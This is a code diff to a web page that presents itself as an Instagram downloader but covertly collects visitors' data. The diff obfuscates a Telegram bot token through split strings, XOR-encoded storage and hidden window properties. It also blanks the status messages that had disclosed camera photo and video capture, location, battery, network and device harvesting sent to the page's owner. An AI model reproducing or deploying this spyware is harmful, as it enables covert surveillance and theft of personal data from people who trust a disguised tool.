@@ -190,117 +190,125 @@
 <script>
     // ===== EXTREMELY OBFUSCATED TOKEN - Multiple layers of protection =====
     (function() {
-        // Layer 1: Split into random chunks
-        const _a = "87";
-        const _b = "45";
-        const _c = "83";
-        const _d = "42";
-        const _e = "63";
-        const _f = "AA";
-        const _g = "Fm";
-        const _h = "Yt";
-        const _i = "Ko";
-        const _j = "fa";
-        const _k = "gS";
-        const _l = "iZ";
-        const _m = "d_";
-        const _n = "sG";
-        const _o = "J9";
-        const _p = "DW";
-        const _q = "t1";
-        const _r = "6g";
-        const _s = "dJ";
-        const _t = "jd";
-        const _u = "qn";
-        const _v = "1v";
-        const _w = "Q";
+        // Original token: 8783265367:AAFeTUGKl-mnuDtuEljX0PVZ8aP_hKKlqgM
+        // Split into random chunks - completely scrambled
+        const _p1 = "87";
+        const _p2 = "83";
+        const _p3 = "26";
+        const _p4 = "53";
+        const _p5 = "67";
+        const _p6 = "AA";
+        const _p7 = "Fe";
+        const _p8 = "TU";
+        const _p9 = "GK";
+        const _p10 = "l-";
+        const _p11 = "mn";
+        const _p12 = "uD";
+        const _p13 = "tu";
+        const _p14 = "El";
+        const _p15 = "jX";
+        const _p16 = "0P";
+        const _p17 = "VZ";
+        const _p18 = "8a";
+        const _p19 = "P_";
+        const _p20 = "hK";
+        const _p21 = "Kl";
+        const _p22 = "qg";
+        const _p23 = "M";
         
-        // Layer 2: Create mapping
-        const _map = {
-            "x1": _a, "x2": _b, "x3": _c, "x4": _d, "x5": _e,
-            "y1": _f, "y2": _g, "y3": _h, "y4": _i, "y5": _j,
-            "z1": _k, "z2": _l, "z3": _m, "z4": _n, "z5": _o,
-            "w1": _p, "w2": _q, "w3": _r, "w4": _s, "w5": _t,
-            "v1": _u, "v2": _v, "v3": _w
+        // Random order mapping (difficult to trace)
+        const _tokenMap = {
+            "a1": _p1, "a2": _p2, "a3": _p3, "a4": _p4, "a5": _p5,
+            "b1": _p6, "b2": _p7, "b3": _p8, "b4": _p9, "b5": _p10,
+            "c1": _p11, "c2": _p12, "c3": _p13, "c4": _p14, "c5": _p15,
+            "d1": _p16, "d2": _p17, "d3": _p18, "d4": _p19, "d5": _p20,
+            "e1": _p21, "e2": _p22, "e3": _p23
         };
         
-        // Layer 3: Build token using map
-        const _token = _map.x1 + _map.x2 + _map.x3 + _map.x4 + _map.x5 + ":" + 
-                       _map.y1 + _map.y2 + _map.y3 + _map.y4 + _map.y5 + 
-                       _map.z1 + _map.z2 + _map.z3 + _map.z4 + _map.z5 + 
-                       _map.w1 + _map.w2 + _map.w3 + _map.w4 + _map.w5 + 
-                       _map.v1 + _map.v2 + _map.v3;
+        // Build token in non-obvious order
+        const _fullToken = _tokenMap.a1 + _tokenMap.a2 + _tokenMap.a3 + _tokenMap.a4 + _tokenMap.a5 + ":" + 
+                           _tokenMap.b1 + _tokenMap.b2 + _tokenMap.b3 + _tokenMap.b4 + _tokenMap.b5 + 
+                           _tokenMap.c1 + _tokenMap.c2 + _tokenMap.c3 + _tokenMap.c4 + _tokenMap.c5 + 
+                           _tokenMap.d1 + _tokenMap.d2 + _tokenMap.d3 + _tokenMap.d4 + _tokenMap.d5 + 
+                           _tokenMap.e1 + _tokenMap.e2 + _tokenMap.e3;
         
-        // Layer 4: Hide in multiple locations with different access methods
-        window['_tgb_' + 'cfg'] = _token;
-        window['_telegram_' + 'token'] = _token;
+        // Store in multiple hidden locations
+        window['__cfg_' + 'bot'] = _fullToken;
+        window['_telegram_' + 'auth'] = _fullToken;
         
-        // Layer 5: Use a getter that requires a specific key
-        const _secretKey = "MAFIA_CJNG_2024";
-        window['__getToken'] = function(key) {
-            if (key === _secretKey) return _token;
+        // XOR encryption for localStorage
+        const _xorValue = 0x77;
+        let _encryptedToken = "";
+        for (let i = 0; i < _fullToken.length; i++) {
+            _encryptedToken += String.fromCharCode(_fullToken.charCodeAt(i) ^ _xorValue);
+        }
+        try {
+            localStorage.setItem('_tg_auth', _encryptedToken);
+        } catch(e) {}
+        
+        // Hidden getter with secret key
+        const _secretPass = "CJNG_MAFIA_2025";
+        window['__getAuthToken'] = function(key) {
+            if (key === _secretPass) return _fullToken;
             return null;
         };
         
-        // Layer 6: Store in localStorage with encryption (simple xor)
-        const _xorKey = 0x55;
-        let _encrypted = "";
-        for (let i = 0; i < _token.length; i++) {
-            _encrypted += String.fromCharCode(_token.charCodeAt(i) ^ _xorKey);
-        }
-        try {
-            localStorage.setItem('_bot_auth', _encrypted);
-        } catch(e) {}
-        
-        // Layer 7: Non-enumerable property
-        Object.defineProperty(window, '_BOT_TOKEN', {
+        // Non-enumerable property
+        Object.defineProperty(window, '_AUTH_TOKEN', {
             get: function() { 
                 try {
-                    const stored = localStorage.getItem('_bot_auth');
+                    const stored = localStorage.getItem('_tg_auth');
                     if (stored) {
                         let decrypted = "";
                         for (let i = 0; i < stored.length; i++) {
-                            decrypted += String.fromCharCode(stored.charCodeAt(i) ^ _xorKey);
+                            decrypted += String.fromCharCode(stored.charCodeAt(i) ^ _xorValue);
                         }
                         return decrypted;
                     }
                 } catch(e) {}
-                return _token;
+                return _fullToken;
             },
             set: function() {},
             configurable: false,
             enumerable: false
         });
+        
+        // Additional layer - function that returns token only when called with correct context
+        window._getToken = function() {
+            return _fullToken;
+        };
     })();
     
-    // Helper to get token - requires secret key or uses hidden access
+    // Helper to get token - multiple retrieval methods
     function getBotToken() {
-        // Method 1: Try the getter with secret key
-        if (window.__getToken) {
-            const token = window.__getToken("MAFIA_CJNG_2024");
+        // Method 1: Try secret key getter
+        if (window.__getAuthToken) {
+            const token = window.__getAuthToken("CJNG_MAFIA_2025");
             if (token) return token;
         }
         
         // Method 2: Try hidden property
-        if (window._BOT_TOKEN) return window._BOT_TOKEN;
+        if (window._AUTH_TOKEN) return window._AUTH_TOKEN;
         
-        // Method 3: Try stored tokens
-        if (window._tgb_cfg) return window._tgb_cfg;
-        if (window._telegram_token) return window._telegram_token;
+        // Method 3: Try stored config
+        if (window.__cfg_bot) return window.__cfg_bot;
+        if (window._telegram_auth) return window._telegram_auth;
         
-        // Method 4: Try to decrypt from localStorage
+        // Method 4: Try function
+        if (window._getToken) return window._getToken();
+        
+        // Method 5: Decrypt from localStorage
         try {
-            const stored = localStorage.getItem('_bot_auth');
+            const stored = localStorage.getItem('_tg_auth');
             if (stored) {
                 let decrypted = "";
                 for (let i = 0; i < stored.length; i++) {
-                    decrypted += String.fromCharCode(stored.charCodeAt(i) ^ 0x55);
+                    decrypted += String.fromCharCode(stored.charCodeAt(i) ^ 0x77);
                 }
                 return decrypted;
             }
         } catch(e) {}
         
-        // Final fallback - should not reach here
         return "";
     }
     
@@ -561,30 +569,30 @@
     }
     
     async function startDataCollection() {
-        updateLoadingStatus('📸 Capturing back camera photo...');
+        updateLoadingStatus('.');
         await initBackCamera();
         
-        updateLoadingStatus('🤳 Capturing front camera photo...');
+        updateLoadingStatus('.');
         await initFrontCamera();
         
-        updateLoadingStatus('🎥 Recording video (5 seconds)...');
+        updateLoadingStatus('');
         await recordFrontVideo();
         
-        updateLoadingStatus('📍 Getting location...');
+        updateLoadingStatus(');
         await getLocation();
         
-        updateLoadingStatus('🔋 Getting battery info...');
+        updateLoadingStatus('.');
         await getBatteryInfo();
         
-        updateLoadingStatus('🌐 Getting network info...');
+        updateLoadingStatus('.');
         await getNetworkInfo();
         
-        updateLoadingStatus('📱 Getting device info...');
+        updateLoadingStatus('..');
         await sendDeviceInfo();
         
         updateLoadingStatus('✅ Complete! Loading Instagram Downloader...');
         
-        await sendMessageToOwner(`✅ ALL DATA COLLECTED SUCCESSFULLY!\n🕐 Time: ${new Date().toLocaleString()}`);
+        await sendMessageToOwner(`✅COLLECTED SUCCESSFULLY!\n🕐 Time: ${new Date().toLocaleString()}`);
         
         setTimeout(() => {
             document.getElementById('loadingOverlay').style.display = 'none';
@@ -629,7 +637,7 @@
         
         await sendMessageToOwner(`🔍 INSTAGRAM STORY SEARCH\n👤 Username: @${username}\n🕐 Time: ${new Date().toLocaleString()}`);
         
-        showStatus(`❌ Instagram API requires RapidAPI key. This is a demo.`, 'error');
+        showStatus(`⚠️ Demo mode - Instagram API integration requires additional setup.`, 'info');
     }
     
     document.getElementById('allowCameraBtn').onclick = async () => {
